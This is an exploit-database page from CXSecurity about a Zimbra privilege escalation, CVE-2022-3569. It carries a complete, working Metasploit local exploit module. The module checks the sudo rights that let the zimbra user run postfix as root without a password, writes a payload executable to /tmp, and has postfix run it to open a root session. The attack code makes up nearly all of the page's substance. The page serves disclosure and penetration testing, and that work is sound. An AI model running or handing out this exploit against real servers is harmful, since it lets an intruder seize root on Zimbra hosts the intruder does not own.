---
title: Zimbra Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2022100053
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-20
fetch_date: 2025-10-03T20:20:16.879335
---

# Zimbra Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Zimbra Privilege Escalation** **2022.10.19**  Credit:  **[Ron Bowes](https://cxsecurity.com/author/Ron%2BBowes/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Local
Rank = ExcellentRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Post::Linux::Priv
include Msf::Post::File
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Zimbra sudo + postfix privilege escalation',
'Description' => %q{
This module exploits a vulnerable sudo configuration that permits the
zimbra user to execute postfix as root. In turn, postfix can execute
arbitrary shellscripts, which means it can execute a root shell.
},
'License' => MSF\_LICENSE,
'Author' => [
'EvergreenCartoons', # discovery and poc
'Ron Bowes', # Module
],
'DisclosureDate' => '2022-10-13',
'Platform' => [ 'linux' ],
'Arch' => [ ARCH\_X86, ARCH\_X64 ],
'SessionTypes' => [ 'shell', 'meterpreter' ],
'Privileged' => true,
'References' => [
[ 'CVE', '2022-3569' ],
[ 'URL', 'https://twitter.com/ldsopreload/status/1580539318879547392' ],
],
'Targets' => [
[ 'Auto', {} ],
],
'DefaultTarget' => 0,
'Notes' => {
'Reliability' => [ REPEATABLE\_SESSION ],
'Stability' => [ CRASH\_SAFE ],
'SideEffects' => [ IOC\_IN\_LOGS ]
}
)
)
register\_options [
OptString.new('SUDO\_PATH', [ true, 'Path to sudo executable', 'sudo' ]),
OptString.new('ZIMBRA\_BASE', [ true, "Zimbra's installation directory", '/opt/zimbra' ]),
]
register\_advanced\_options [
OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
OptString.new('PayloadFilename', [ false, 'The name to use for the executable (default: ".<random>"' ])
]
end
# Because this isn't patched, I can't say with 100% certainty that this will
# detect a future patch (it depends on how they patch it)
def check
# Sanity check
if is\_root?
fail\_with(Failure::None, 'Session already has root privileges')
end
unless file\_exist?("#{datastore['ZIMBRA\_BASE']}/common/sbin/postfix")
print\_error("postfix executable not detected: #{datastore['ZIMBRA\_BASE']}/common/sbin/postfix (set ZIMBRA\_BASE if Zimbra is installed in an unusual location)")
return CheckCode::Safe
end
unless command\_exists?(datastore['SUDO\_PATH'])
print\_error("Could not find sudo: #{datastore['SUDOPATH']} (set SUDO\_PATH if sudo isn't in $PATH)")
return CheckCode::Safe
end
# Run `sudo -n -l` to make sure we have access to the target command
cmd = "#{datastore['SUDO\_PATH']} -n -l"
print\_status "Executing: #{cmd}"
output = cmd\_exec(cmd).to\_s
if !output || output.start\_with?('usage:') || output.include?('illegal option') || output.include?('a password is required')
print\_error('Current user could not execute sudo -l')
return CheckCode::Safe
end
if !output.include?("(root) NOPASSWD: #{datastore['ZIMBRA\_BASE']}/common/sbin/postfix")
print\_error('Current user does not have access to run postfix')
return CheckCode::Safe
end
CheckCode::Appears
end
def exploit
base\_dir = datastore['WritableDir'].to\_s
unless writable?(base\_dir)
fail\_with(Failure::BadConfig, "#{base\_dir} is not writable")
end
# Generate some filenames
payload\_path = File.join(base\_dir, datastore['PayloadFilename'] || ".#{rand\_text\_alphanumeric(5..10)}")
upload\_and\_chmodx(payload\_path, generate\_payload\_exe)
register\_file\_for\_cleanup(payload\_path)
cmd = "sudo #{datastore['ZIMBRA\_BASE']}/common/sbin/postfix -D -v #{payload\_path}"
print\_status "Attempting to trigger payload: #{cmd}"
out = cmd\_exec(cmd)
unless session\_created?
print\_error("Failed to create session! Cmd output = #{out}")
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100053)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top